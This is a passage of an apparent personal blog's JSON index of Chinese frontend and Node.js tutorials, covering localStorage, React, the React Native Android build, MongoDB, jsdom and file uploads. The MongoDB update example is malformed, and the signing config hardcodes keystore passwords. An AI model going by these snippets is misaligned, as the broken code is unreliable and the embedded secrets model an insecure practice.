'cats.png'); localStorage.length; // 返回 3&#125; 实际上localStorage 是一个对象，当你直接输出 localStorage 的时候，就可以看到它的存储方式。所以，localStorage 可以使用所有 Object 的方法。 12345678910111213console.log(localStorage);/*Storage &#123; bgcolor: \"yellow\", font: \"Helvetica\", image: \"cats.png\", length: 3&#125;*/console.log(Object.keys(localStorage));// [\"bgcolor\", \"font\", \"image\"] 可以把它当成普通对象一样使用：（不过这样不友好，不建议） 12345678910console.log(localStorage.bgcolor);// yellowconsole.log(localStorage.getItem('bgcolor'));// yellowlocalStorage.bgcolor = 'blue';console.log(localStorage.getItem('bgcolor'));// bluelocalStorage.setItem('bgcolor', 'green');// green 提升HTML5的本地存储都是只能存储 String 类型的数据，任何其他类型都会转成字符串存储。例如： 123456789localStorage.setItem('user', &#123; name: 'xiaoming', age: 20,&#125;);localStorage.setItem('age', 20);localStorage.getItem('user'); // '[object Object]'localStorage.getItem('age'); // '20' 为了解决这些问题，最实在的方式是利用 JSON 进行序列化：把对象序列化成字符串： 12345678910111213141516// 序列化var user = JSON.stringify(&#123; name: 'xiaoming', age: 20,&#125;);// '&#123;\"name\":\"xiaoming\",\"age\":20&#125;'localStorage.setItem('user', user);localStorage.getItem('user');// '&#123;\"name\":\"xiaoming\",\"age\":20&#125;'// 反序列化var _user = JSON.parse( localStorage.getItem('user'));// &#123; name: 'xiaoming', age: 20 &#125;","categories":[{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/categories/HTML5/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"},{"name":"数据持久化","slug":"数据持久化","permalink":"http://me.lizhooh.com/tags/数据持久化/"}]},{"title":"React 子组件传参，父组件调用","slug":"React/React/React 子组件传参，父组件调用","date":"2016-12-11T14:11:12.000Z","updated":"2021-06-15T06:10:52.877Z","comments":true,"path":"/stories/2016/12/React/React/React 子组件传参，父组件调用/","link":"","permalink":"http://me.lizhooh.com/stories/2016/12/React/React/React 子组件传参，父组件调用/","excerpt":"有些参数值必须在子组件中才能用。 但是我们想在父组件里去调用这些参数，这样的话，可以利用 props 的特点与 javascript 函数的特点。","text":"有些参数值必须在子组件中才能用。 但是我们想在父组件里去调用这些参数，这样的话，可以利用 props 的特点与 javascript 函数的特点。 子组件先来写一个子组件，它有一个点击事件：onPress，在onPress里想传递一点参数，然后再父组件里调用 123456789101112131415161718192021222324252627export default class Child extends Component &#123; constructor(props) &#123; super(props); &#125; static defaultProps = &#123; onChildPress: null, &#125;; static propTypes = &#123; onChildPress: React.PropTypes.func &#125;; render() &#123; return ( &lt;Button onPress=&#123;() =&gt; &#123; // 向父级传递参数 (1, \"Heloo\") this.props.onChildPress(1, 'Hello'); &#125;&#125; &gt; &lt;Text&gt;Child&lt;/Text&gt; &lt;/Button&gt; ); &#125;&#125; 父组件在父组件中调用： 12345678910111213141516171819export default class Parent extends Component &#123; constructor(props) &#123; super(props); &#125; render() &#123; return( &lt;View&gt; &lt;Child onChildPress=&#123;(index, title) =&gt; &#123; // (1, \"Hello\") console.log(`index: $&#123;index&#125;, title: $&#123;title&#125;`); &#125;&#125; /&gt; &lt;/View&gt; ) &#125;&#125; 这样就可以轻松的实现：子组件传参，父组件调用","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React Native Android 打包","slug":"React Native/React Native Android 打包","date":"2016-12-10T13:57:12.000Z","updated":"2021-06-15T06:10:52.858Z","comments":true,"path":"/stories/2016/12/React Native/React Native Android 打包/","link":"","permalink":"http://me.lizhooh.com/stories/2016/12/React Native/React Native Android 打包/","excerpt":"React Native Android 打包需要注意的几点： Android应用在发布前，需要生成发布版本安装包，然后上传至发布平台React Native Android 打包分为以下几步： 生成发布密钥签名 修改 gradle 配置文件 生成发布版本安装包","text":"React Native Android 打包需要注意的几点： Android应用在发布前，需要生成发布版本安装包，然后上传至发布平台React Native Android 打包分为以下几步： 生成发布密钥签名 修改 gradle 配置文件 生成发布版本安装包 1. 生成发布密钥签名Android 开发环境自带密钥生成工具，在android/keystores/的控制台下输入以下命令： 1keytool -genkey -v -keystore app-key.keystore -alias my-key -keyalg RSA -keysize 2048 -validity 10000 其中： app-key.keystore 代表着密钥文件名 my-key 代表着密钥别名 -keysize 代表着密钥大小 -validity 代表着密钥的有效期（天） 之后输入一些信息，密码之类的 控制台图片 2. 修改 gradle 配置文件为了生成发布版本，需要修改 React Native 项目中 Android 项目的 build.gradle 文件。在 /android/app 目录下 123456789101112131415161718192021222324signingConfigs &#123; release &#123; storeFile file(\"../keystores/app-key.keystore\") // 这里是签名文件路径 storePassword \"myapp123\" // 签名的密码 keyAlias \"my-key\" // 签名的别名 keyPassword \"321ppaym\" // 别名的密码 &#125;&#125;splits &#123; abi &#123; reset() enable enableSeparateBuildPerCPUArchitecture universalApk false // If true, also generate a universal APK include \"armeabi-v7a\", \"x86\" &#125;&#125;buildTypes &#123; release &#123; minifyEnabled enableProguardInReleaseBuilds proguardFiles getDefaultProguardFile(\"proguard-android.txt\"), \"proguard-rules.pro\" signingConfig signingConfigs.release // 记得加上这句“配置项” &#125;&#125; 3. 生成发布版本安装包进入android子目录下，在命令行下输入： 1.\\gradlew assembleRelease 注意： windows 上是 .\\ ，linux 上是 ./ 开头 回车后，它会进行一系列的编译，最后生成的 app 文件位置：/android/app/build/outputs/apk/app-release.apk apk npm scripts把打包命令添加到 npm scripts 里： 12\"build\": \" cd android &amp; .\\\\gradlew assembleRelease\",\"clean\": \"cd android &amp;&amp; gradlew clean\", // 清理 build 缓存 最后如果没什么问题，就能在手机上安装成功，并且完美的运行。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native style 样式属性名提示技巧","slug":"React Native/Styles/React Native style 样式属性名","date":"2016-12-08T02:29:12.000Z","updated":"2021-06-15T06:10:52.870Z","comments":true,"path":"/stories/2016/12/React Native/Styles/React Native style 样式属性名/","link":"","permalink":"http://me.lizhooh.com/stories/2016/12/React Native/Styles/React Native style 样式属性名/","excerpt":"因为，很多编辑器都不能给对象的内部属性进行智能提示。这就意味着，写 style 的时候需要自己一字不漏的敲出来。加上我自己的记性不太好，对于一些很长的英语单词，一字不漏的敲出来实在是太戳了。","text":"因为，很多编辑器都不能给对象的内部属性进行智能提示。这就意味着，写 style 的时候需要自己一字不漏的敲出来。加上我自己的记性不太好，对于一些很长的英语单词，一字不漏的敲出来实在是太戳了。 123456789101112131415161718let Dimensions = require(\"Dimensions\"), totalWidth = Dimensions.get('window').width, totalHeight = Dimensions.get('window').height;const styles = StyleSheet.create(&#123; body: &#123; flex : 1, backgroundColor : 'rgba(1, 1, 1, 0.05)', &#125;, image: &#123; left : totalWidth * 0.1, width : totalWidth * 0.8, height : 400, marginTop : 20, borderRadius : 5, resizeMode : 'contain' &#125;&#125;); 最后想到了一个方法：那就是在编辑器里新开一个窗口（最好是有两个窗口可以并排显示的编辑器），并把 style 样式属性的名称制作成 JSON 数据（也可以是其他，最好是编辑器对它有颜色区别的格式）。 就像这样，我使用的是 Visual Studio Codehttps://code.visualstudio.com/ 编辑器。 忘词的时候，就可以看看右边的，或者直接复制。 \\(“▔□▔)/这样再也不用怕忘词了，太好了。 vscode styleName.json 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104[ \"alignItems\", \"alignSelf\", \"backfaceVisibility\", \"backgroundColor\", \"borderBottomColor\", \"borderBottomLeftRadius\", \"borderBottomRightRadius\", \"borderBottomWidth\", \"borderColor\", \"borderLeftColor\", \"borderLeftWidth\", \"borderRadius\", \"borderRightColor\", \"borderRightWidth\", \"borderStyle\", \"borderTopColor\", \"borderTopLeftRadius\", \"borderTopRightRadius\", \"borderTopWidth\", \"borderWidth\", \"bottom\", \"color\", \"decomposedMatrix\", \"elevation\", \"flex\", \"flexBasis\", \"flexDirection\", \"flexGrow\", \"flexShrink\", \"flexWrap\", \"fontFamily\", \"fontSize\", \"fontStyle\", \"fontVariant\", \"fontWeight\", \"height\", \"justifyContent\", \"left\", \"letterSpacing\", \"lineHeight\", \"margin\", \"marginBottom\", \"marginHorizontal\", \"marginLeft\", \"marginRight\", \"marginTop\", \"marginVertical\", \"maxHeight\", \"maxWidth\", \"minHeight\", \"minWidth\", \"opacity\", \"overflow\", \"overlayColor\", \"padding\", \"paddingBottom\", \"paddingHorizontal\", \"paddingLeft\", \"paddingRight\", \"paddingTop\", \"paddingVertical\", \"position\", \"resizeMode\", \"right\", \"rotation\", \"scaleX\", \"scaleY\", \"shadowColor\", \"shadowOffset\", \"shadowOpacity\", \"shadowRadius\", \"textAlign\", \"textAlignVertical\", \"textDecorationColor\", \"textDecorationLine\", \"textDecorationStyle\", \"textShadowColor\", \"textShadowOffset\", \"textShadowRadius\", \"tintColor\", \"top\", \"transform\", \"transformMatrix\", \"translateX\", \"translateY\", \"width\", \"writingDirection\", \"zIndex\"]","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"原生 MongoDB 驱动的使用","slug":"MongoDB/原生 MongoDB 驱动的使用","date":"2016-11-14T02:49:56.000Z","updated":"2021-06-15T06:10:52.828Z","comments":true,"path":"/stories/2016/11/MongoDB/原生 MongoDB 驱动的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2016/11/MongoDB/原生 MongoDB 驱动的使用/","excerpt":"前言Mongoose 用多了竟然某一天发现连原生的 MongoDB 驱动都不会使用。","text":"前言Mongoose 用多了竟然某一天发现连原生的 MongoDB 驱动都不会使用。 基本使用1234567891011import mongodb from 'mongodb';+ async function() &#123; const mongo = await mongodb.MongoClient.connect('mongodb://localhost:27017'); const db = await mongo.db('test'); const coll = await db.collection('user'); const list = await coll.find(&#123; status: 1 &#125;).toArray(); // 一般说，后端服务应该保持连接 await mongo.close();&#125; () 注意：如果返回的是数组则需要调用 toArray 方法。 查询1const res = await coll.find(&#123; status: 1 &#125;).limit(10).toArray(); 更新1const res = await coll.update(&#123; status: 1, &#123; $set: &#123; status: 2 &#125; &#125; &#125;); 插入1const res = await coll.insertMany([&#123; status: 1 &#125;, &#123; status: 2 &#125;]); 删除1const res = await coll.deleteOne(&#123; status: 2 &#125;); 参考资料 https://www.npmjs.com/package/mongodb","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"JsDom 使用指南","slug":"抓包&爬虫/JsDom 使用指南","date":"2016-10-12T02:05:57.000Z","updated":"2021-06-15T06:10:52.916Z","comments":true,"path":"/stories/2016/10/抓包&爬虫/JsDom 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2016/10/抓包&爬虫/JsDom 使用指南/","excerpt":"前言jsdom 是许多 Web 标准的纯 JavaScript 实现，特别是 WHATWG DOM 和 HTML 标准，用于 Node.js。一般来说，该项目的目标是模拟足够多的 Web 浏览器子集，以便用于测试和挖掘真实世界的 Web 应用程序。 说白，一般我们会使用它来在 Nodejs 上解析 DOM。 jsdom","text":"前言jsdom 是许多 Web 标准的纯 JavaScript 实现，特别是 WHATWG DOM 和 HTML 标准，用于 Node.js。一般来说，该项目的目标是模拟足够多的 Web 浏览器子集，以便用于测试和挖掘真实世界的 Web 应用程序。 说白，一般我们会使用它来在 Nodejs 上解析 DOM。 jsdom 基本使用jsdom 和 cheerio 有类似功能，但是 cheerio 更倾向于 DOM 的解析，而 jsdom 除了 DOM 解析外还有一些其他的功能。 12345const jsdom = require(\"jsdom\");const &#123; JSDOM &#125; = jsdom;// 一个 DOM 就这么来了const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);console.log(dom.window.document.querySelector(\"p\").textContent); 这样就构造了一个 DOM 处理，后面的处理基本都是操作 DOM 节点。 也可以把 JQuery 加载进去： 123456jsdom.env(\"http://www.baidu.com\", [\"http://code.jquery.com/jquery.js\"], (err, window) =&gt; &#123; console.log(window.$('title').html()); console.log(window.$('.sizeBox').html()); &#125;) 构造函数JSDOM 的构造函数有一系列的配置项。 1234567const dom = new JSDOM(html, &#123; url: \"https://example.org/\", referrer: \"https://example.com/\", contentType: \"text/html\", userAgent: \"Mellblomenator/9000\", includeNodeLocations: true&#125;); 说明： url：默认为”about:blank”，这是一个 url 地址，可以通过 window.location，document.URL 获取。 referrer：影响 document.referrer 的值。 contentType：影响 document.contentType 以及如何解析文档，默认为”text/html”。 userAgent：影响 navigator.userAgent 的值，浏览器的标识。 includeNodeLocations：保留由 HTML 解析器产生的位置信息，它默认为 false 提供最佳性能。 执行 scriptjsdom 最强大的功能是它可以在 jsdom 中执行脚本，jsdom 提供了一个沙盒环境。但是要注意的是，如果 script 足以强大，可以击穿沙盒访问 Nodejs 环境。 1234567const dom = new JSDOM(` &lt;body&gt; &lt;script&gt;document.body.appendChild(document.createElement(\"hr\"));&lt;/script&gt; &lt;/body&gt;`);dom.window.document.body.children.length === 1; 在默认情况下，所有的 script 并不会运行，如果要运行则需要使用 dangerously 选项。 1234567const dom = new JSDOM(` &lt;body&gt; &lt;script&gt;document.body.appendChild(document.createElement(\"hr\"));&lt;/script&gt; &lt;/body&gt;`, &#123; runScripts: \"dangerously\" &#125;);dom.window.document.body.children.length === 2; 如果从外部执行脚本，而不是让 script 元素执行，那么使用 outside-only 选项。 1234const window = (new JSDOM(``, &#123; runScripts: \"outside-only\" &#125;)).window;window.eval(`document.body.innerHTML = \"&lt;p&gt;Hello, world!&lt;/p&gt;\";`);window.document.body.children.length === 1; 假装成一个视觉浏览器jsdom 没有渲染可视内容的能力，在默认情况下会像无头浏览器一样工作。 当 pretendToBeVisual 选项设置为 true，jsdom 会假装它正在渲染并显示内容。 12345const window = (new JSDOM(``, &#123; pretendToBeVisual: true &#125;)).window;window.requestAnimationFrame(timestamp =&gt; &#123; console.log(timestamp &gt; 0);&#125;); 加载子资源默认情况下，jsdom 不会加载任何子资源，如脚本，样式表，图像或 iframe。如果希望加载，设置 usable 选项。 1const dom = new JSDOM(html, &#123; resources: \"usable\" &#125;); 虚拟控制台在 jsdom 里有一个 virtual console 类似 console 的使用。 12345678const virtualConsole = new jsdom.VirtualConsole();virtualConsole.on(\"error\", () =&gt; &#123; ... &#125;);virtualConsole.on(\"warn\", () =&gt; &#123; ... &#125;);virtualConsole.on(\"info\", () =&gt; &#123; ... &#125;);virtualConsole.on(\"dir\", () =&gt; &#123; ... &#125;);const dom = new JSDOM(``, &#123; virtualConsole &#125;); 当，在 html 里使用 console 时，virtualConsole 提供对应的输出，获取相关信息。 virtualConsole 提供了一个输出流重定向，可以把 virtualConsole 重定向到 Nodejs 的 console 上。 1virtualConsole.sendTo(console); cookie jar像网页浏览器一样，jsdom 具有 cookie jar 的概念。默认情况下，JSDOM 构造函数将返回一个带有空 cookie 的实例，cookie 最好自己去设置。 12const cookieJar = new jsdom.CookieJar(store, options);const dom = new JSDOM(html, &#123; cookieJar &#125;); 参考资料 https://github.com/jsdom/jsdom","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"Nodejs 文件上传","slug":"Nodejs/Nodejs 文件上传","date":"2016-08-21T07:29:30.000Z","updated":"2021-06-15T06:10:52.840Z","comments":true,"path":"/stories/2016/08/Nodejs/Nodejs 文件上传/","link":"","permalink":"http://me.lizhooh.com/stories/2016/08/Nodejs/Nodejs 文件上传/","excerpt":"文件上传Nodejs 文件上传，最原始的是利用 req.body 来实现，但是这样非常不好扩展。 对于复合表单处理，目前有两种流行而健壮的选择：Busboy 和 Formidable。我发现 Formidable 要稍微简单一些，因为它有一个方便的回调方法，能够提供包含字段和文件信息的对象。对于 Busboy 而言，你必须对每一个字段和文件事件进行监听。 同步与异步本文，介绍两个文件上传的方式：同步与异步 同步基于：Formidable异步基于：jQuery-File-Upload","text":"文件上传Nodejs 文件上传，最原始的是利用 req.body 来实现，但是这样非常不好扩展。 对于复合表单处理，目前有两种流行而健壮的选择：Busboy 和 Formidable。我发现 Formidable 要稍微简单一些，因为它有一个方便的回调方法，能够提供包含字段和文件信息的对象。对于 Busboy 而言，你必须对每一个字段和文件事件进行监听。 同步与异步本文，介绍两个文件上传的方式：同步与异步 同步基于：Formidable异步基于：jQuery-File-Upload 基于Express借助 Express 的路由机制 1234var express = require('express'), app = express();app.set('port', 8888); 先设置静态资源目录： 123456789app.use(express.static( path.join(__dirname, 'public')));// 或者app.get('/public*', function(req, res) &#123; var url = req.url; res.sendFile(__dirname + url);&#125;); Form 方式进行同步上传文件基于 Formidable 的异步文件上传方式。 FormidableFormidable 是一个很好的文件上传封装模块。 sNPM: https://www.npmjs.com/package/formidable Formidable API 使用1234567891011121314151617181920212223242526272829303132333435363738394041424344// 下载对应包npm install --save formidable// 引入模块var formidable = require('formidable');// 创建Formidable.IncomingForm对象var form = new formidable.IncomingForm();// 设置表单域的编码form.encoding = 'utf-8'// 设置上传文件存放的临时文件夹，默认为系统的临时文件夹form.uploadDir = \"/my/dir\";// 设置该属性为true可以使得上传的文件保持原来的文件的扩展名form.keepExtensions = false;// 限制所有存储表单字段域的大小，超出会触发error事件，默认2Mform.maxFieldsSize = 2 * 1024 * 1024;// 设置上传文件的检验码，可以有两个取值'sha1' or 'md5'.form.hash = false;// true时，当调用form.parse()方法时，回调函数的files参数将会是file数组，需要html5中multiple特性form.multiples = false;// 返回服务器已经接收到当前表单数据多少字节form.bytesReceived// 返回将要接收到当前表单所有数据的大小form.bytesExpected// (常用)* 该方法会转换请求中所包含的表单数据，callback会包含所有字段域和文件信息form.parse(req, function(error, fields, files) &#123;&#125;);// 每当有一对字段/文件已经接收到，便会触发该事件form.on('file', function(name, file) &#123;&#125;);// 当上传流中出现错误便会触发该事件form.on('error', function(error) &#123;&#125;);// 当所有的请求已经接收到，并且所有的文件都已上传到服务器中，该事件会触发form.on('end', function() &#123;&#125;); 前端工作首先，需要做好前端的工作，编写html页面。以同步的方式进行文件上传，在前端里面非常简单，只需要在&lt;from&gt;里面写好action就可以了。 123456789101112131415161718192021&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/public/css/semantic.min.css\"/&gt;&lt;style&gt; .ui *&#123; font-family: \"Consolas\" !important; font-size: 17px !important; &#125;&lt;/style&gt;&lt;div class=\"ui grid\"&gt; &lt;div class=\"eight wide centered column\"&gt; &lt;form class=\"ui form\" id=\"form\" method=\"post\" enctype=\"multipart/form-data\" action=\"/contest/&#123;&#123;year&#125;&#125;/&#123;&#123;month&#125;&#125;\"&gt; &lt;div class=\"field\"&gt; &lt;div class=\"ui file\"&gt; &lt;input type=\"file\" name=\"file\" id=\"fieldPhoto\" multiple/&gt; &lt;/div&gt; &lt;/div&gt; &lt;button class=\"ui button\" type=\"submit\" id=\"sub\"&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt; 文件上传 后端配置路由这里需要用 Express 配置路由，假设这是个 /about 123456789101112131415app.get('/about', function(req, res) &#123; var now = new Date(); res.render('about', &#123; // 模版引擎数据 year: now.getFullYear(), month: now.getMonth(), fortune: forturn.getForurn(), title: 'Again', &#125;, function(error, html) &#123; res.status(200).send(html); &#125; );&#125;); 引入 Formidable 模块1npm install --save formidable 并创建对象 1var formidable = require('formidable'); 配置文件上传后处理的路由 (注意：如果部分文件夹不存在，会抛出异常：No such file or directory 文件路径不存在) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// 文件上传的url地址app.post('/contest/:year/:month', function(req, res) &#123; // 创建 formidable 对象 var form = new formidable.IncomingForm(); // 文件上传临时文件存放路径 form.uploadDir = __dirname + '/public/tmp'; // 解析文件 form.parse(req, function(error, fields, files) &#123; if(error) return res.redirect(303, '/error'); // 根据 name 的名称, &lt;input name=\"file\" type=\"file\" /&gt; var file = files.file; // 设置新的文件名 var name = Date.now() + '-' + path.basename(file.name); // 限制上传文件类型 var docType = ['image/jpeg', 'image/png', 'image/gif']; // 文件类型不是合法的 if(docType.indexOf(file.type) == -1) &#123; //手动触发 error form.emit('error', \"不允许的类型\"); // 删掉临时文件 fs.unlink(file.path, function(error) &#123; if(error) console.warn(error); &#125;); &#125; else &#123; // 移动文件到指定目录 fs.rename(file.path, __dirname + '/public/uploads/' + name, function(error) &#123; if(error) console.warn(error); &#125; ); // 返回文件上传成功后的信息 res.send(files); &#125; &#125;); form.on('end', function() &#123; // 上传完成后，处理的工作，比如跳转到其他页面 &#125;);&#125;); 这样的会，基本实现的用 form 同步的文件上传。这是 res.send(files); 返回的信息 文件上传 Ajax 方式进行异步上传文件基于 jQuery-File-Upload 的异步文件上传方式。 前端工作首先，需要做好前端的工作，编写html页面。注意 data-url=”/upload” 是上传处理地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;style&gt; .ui *&#123; font-family: \"Consolas\" !important; font-size: 17px !important; &#125; .ui p&#123; margin: 5px !important; &#125; .ui label&#123; margin: 2px !important; &#125; .ui .bar &#123; height: 1; color: white; background: #00ACED; &#125;&lt;/style&gt;&lt;div class=\"ui grid\"&gt; &lt;div class=\"eight wide centered column\"&gt; &lt;form class=\"ui form\" id=\"form\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;div class=\"field\"&gt; &lt;div class=\"ui file\"&gt; &lt;input type=\"file\" name=\"file\" id=\"fieldPhoto\" data-url=\"/upload\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;button class=\"ui button\" type=\"submit\" id=\"sub\"&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;!--手动上传--&gt; &lt;div class=\"ui message\" id=\"upbut\"&gt;&lt;/div&gt; &lt;div class=\"ui message\"&gt; &lt;!--动态加载条--&gt; &lt;div id=\"progress\"&gt; &lt;div class=\"bar\" style=\"width: 0%;\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"header\"&gt;File List : &lt;/div&gt; &lt;!--文件列表--&gt; &lt;p&gt; &lt;div id=\"uploads\"&gt;&lt;/div&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div 文件上传 jQuery-File-Upload使用 Ajax 异步上传要用到一些JQuery插件， jQuery File Upload 是一个真正别出心裁的文件上传，可拖拽，可以看到上传文件缩略图，并查能看进度条的优秀JQuery插件，在Github上已有20000+star而 Jquery-File-Upload-Middleware 则是 jQuery-File-Upload 在 Nodejs 上的中间件。在前端页面中需要添加一些，Js代码来进行Ajax，使用 jQuery File Upload 你必须引入一些依赖库。 12345&lt;script src=\"/public/js/jquery.min.js\" &gt;&lt;/script&gt;&lt;!--相关依赖库--&gt;&lt;script src=\"/public/js/jquery.ui.widget.js\"&gt;&lt;/script&gt;&lt;script src=\"/public/js/jquery.iframe-transport.js\"&gt;&lt;/script&gt;&lt;script src=\"/public/js/jquery.fileupload.js\"&gt;&lt;/script&gt; 接着编写js, 配置相关参数 前端配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$(function() &#123; $('#fieldPhoto').fileupload( &#123; dataType: 'json', // 在传递过程中触发，用于制作动态加载条 progressall: function(e, data) &#123; // 计算百分比 var progress = parseInt(data.loaded / data.total * 100, 10); // 设置动画 $('#progress .bar') .stop() .animate(&#123;'width': progress + '%'&#125;, 120) .text(progress + '%'); if(progress &gt;= 100) &#123; $('#progress .bar').css('width', '0%'); &#125; &#125;, /* // 选择文件，显示到界面，但是不上传。点击文件名后上传 add: function (e, data) &#123; data.context = $('&lt;label class=\"ui label\"&gt;').text(data.files[0].name) .appendTo($('#upbut')) .click(function () &#123; $(this).replaceWith($('&lt;p/&gt;').text(data.files[0].name + ' Ok...')); data.submit(); &#125;); &#125;, */ // 上传结束后触发 done: function(e, data) &#123; // 遍历已经上传的文件 $.each(data.result.files, function(index, file) &#123; var html ='&lt;p&gt;&lt;a href=\"' + file.url + '\" target=\"_blank\"&gt; ' + file.originalName + ' &lt;/a&gt; size: ' + parseInt(file.size/1024) +' KB. &lt;/p&gt;'; $('#uploads').append(html); console.log(file); &#125;); &#125; &#125;);&#125;); 后端配置服务端设置，首先，安装 jquery-file-upload-middleware 包 1npm install --save jquery-file-upload-middleware 然后在你的应用文件中添加以下代码： 1var jqupload = require('jquery-file-upload-middleware'); 接着，去编写 Nodejs 的路由配置 12345678910111213141516171819202122232425app.use('/upload', function(request, response, next) &#123; var time = new Date, stamp = time.getTime(), day = time.getDate(), month = time.getMonth() + 1, year = time.getFullYear(); // 按天来对文件进行分组 var filename = year + '-' + month + '-' + day; // 上传开始时触发 jqupload.on('begin', function(fileInfo, request, response) &#123; // 设置新名称 fileInfo.name = stamp + '-' + fileInfo.originalName; &#125;); jqupload.fileHandler(&#123; uploadDir: function() &#123; return __dirname + '/public/uploads/' + path.basename(filename); &#125;, uploadUrl: function() &#123; return '/public/uploads/' + path.basename(filename); &#125;, &#125;)(request, response, next);&#125;); 配置完成后，对页面进行测试。点击上传后，获得相关文件信息 文件上传 根据 console.log(file); 在控制台可以看到一个文件信息对象 文件上传 去访问图片的 url , 发现能正常访问 Ajax文件上传 OK 文件上传 非自动上传当时你会发现，每次选择文件后就会自动上传。这是 jquery-file-upload 的默认设置造成的。 因此，把上面 js 注释去掉后，就可以根据自己的需求时间来上传。 12345678add: function (e, data) &#123; data.context = $('&lt;label class=\"ui label\"&gt;').text(data.files[0].name) .appendTo($('#upbut')) .click(function () &#123; $(this).replaceWith($('&lt;p/&gt;').text(data.files[0].name + ' Ok...')); data.submit(); &#125;);&#125;, 当你点击每个 label 时，文件才会上传到服务器里，不点击，文件只会临时保存在内存中。 参考资料 Node-formidable API 说明：https://github.com/felixge/node-formidable jQuery-File-Upload API 说明：https://github.com/blueimp/jQuery-File-Upload/wiki/API jquery-file-upload-middleware API 说明：https://github.com/aguidrevitch/jquery-file-upload-middleware","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Sass 学习笔记","slug":"Style/Sass 学习笔记","date":"2016-03-19T15:05:35.000Z","updated":"2021-06-15T06:10:52.895Z","comments":true,"path":"/stories/2016/03/Style/Sass 学习笔记/","link":"","permalink":"http://me.lizhooh.com/stories/2016/03/Style/Sass 学习笔记/","excerpt":"简介Sass 是一款强化 CSS 的辅助工具，它在 CSS 语法的基础上增加了变量 (variables)、嵌套 (nested rules)、混合 (mixins)、导入 (inline imports) 等高级功能，这些拓展令 CSS 更加强大与优雅。 导入12@import \"reset.css\"; // css@import \"index\"; // sass","text":"简介Sass 是一款强化 CSS 的辅助工具，它在 CSS 语法的基础上增加了变量 (variables)、嵌套 (nested rules)、混合 (mixins)、导入 (inline imports) 等高级功能，这些拓展令 CSS 更加强大与优雅。 导入12@import \"reset.css\"; // css@import \"index\"; // sass 变量12345678910111213141516171819202122232425// 普通变量$fontSize: 12px;// 默认变量$baseLineHeight: 1.5 !default;// 覆盖默认变量，需要写在 !default 前面$baseLineHeight: 1.7;$baseLineHeight: 1.5 !default;// 一维 list$px: (5px 10px 20px 30px);// 二维 list$px: (5px 10px) (20px 30px);// 或者$pxs: 5px 10px, 20px 30px;// Map 类似对象$heading: ( h1: 2em, h2: 1.5em, h3: 1.2em); 插值插值使用 #{} 123456789// Variables$mySelector: banner;// .banner.#&#123;mySelector&#125; &#123; font-weight: bold; line-height: 40px; margin: 0 auto;&#125; 跳出嵌套 @at-root (without: rule| all | media) 1234567891011121314151617181920212223// 跳出普通的嵌套.demo &#123; animation: motion 3s infinite; @at-root &#123; @keyframes motion &#123; ... &#125; &#125;&#125;// 跳出 media 嵌套@media print &#123; .parent2&#123; color:#f00; @at-root (without: media) &#123; .child2 &#123; width:200px; &#125; &#125; &#125;&#125; 混合(mixin)使用 @mixin 声明混合，可以传递参数，参数名以$符号开始，多个参数以逗号分开，也可以给参数设置默认值。@mixin 通过 @include 来调用。混合器中不仅可以包含属性，也可以包含 css 规则，包含选择器和选择器中的属性，也可以使用 &amp; 上下文。 